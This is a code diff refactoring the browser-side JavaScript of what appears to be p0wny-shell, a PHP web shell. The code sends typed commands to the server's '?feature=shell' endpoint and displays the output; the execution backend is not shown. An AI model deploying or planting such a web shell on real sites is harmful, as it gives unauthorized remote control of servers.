@@ -124,7 +124,7 @@ if (isset($_GET["feature"])) {
 
                 function _insertCommand(command) {
                     eShellContent.innerHTML += "\n\n";
-                    eShellContent.innerHTML += `<span class=\"shell-prompt\">${genPrompt(CWD)}</span> `;
+                    eShellContent.innerHTML += '<span class=\"shell-prompt\">' + genPrompt(CWD) + '</span> ';
                     eShellContent.innerHTML += escapeHtml(command);
                     eShellContent.innerHTML += "\n";
                     eShellContent.scrollTop = eShellContent.scrollHeight;
@@ -136,10 +136,6 @@ if (isset($_GET["feature"])) {
                 }
 
                 _insertCommand(command);
-                // return $.post("?feature=shell", {cmd: command, cwd: CWD}, "json")
-                //     .then(response => _insertStdout(response.stdout.join("\n")) || response)
-                //     .then(response => updateCwd(response.cwd) || response)
-                //     .fail(error => _insertStdout("AJAX ERROR: " + JSON.stringify(error)));
                 makeRequest('?feature=shell', {cmd: command, cwd: CWD}, function(response) {
                     _insertStdout(response.stdout.join("\n"));
                     updateCwd(response.cwd);
@@ -151,9 +147,9 @@ if (isset($_GET["feature"])) {
                 var shortCwd = cwd;
                 if (cwd.split("/").length > 3) {
                     var splittedCwd = cwd.split("/");
-                    shortCwd = `…/${splittedCwd[splittedCwd.length-2]}/${splittedCwd[splittedCwd.length-1]}`;
+                    shortCwd = '…/' + splittedCwd[splittedCwd.length-2] + '/' + splittedCwd[splittedCwd.length-1];
                 }
-                return `p0wny@shell:<span title="${cwd}">${shortCwd}</span>#`
+                return 'p0wny@shell:<span title="' + cwd + '">' + shortCwd + '</span>#';
             }
 
             function updateCwd(cwd) {
@@ -183,7 +179,7 @@ if (isset($_GET["feature"])) {
 
             function _onShellCmdKeyDown(event) {
                 var eShellCmdInput = document.getElementById("shell-cmd");
-                if (event.key == "Enter") {
+                if (event.key === "Enter") {
                     featureShell(eShellCmdInput.value);
                     eShellCmdInput.value = "";
                 }
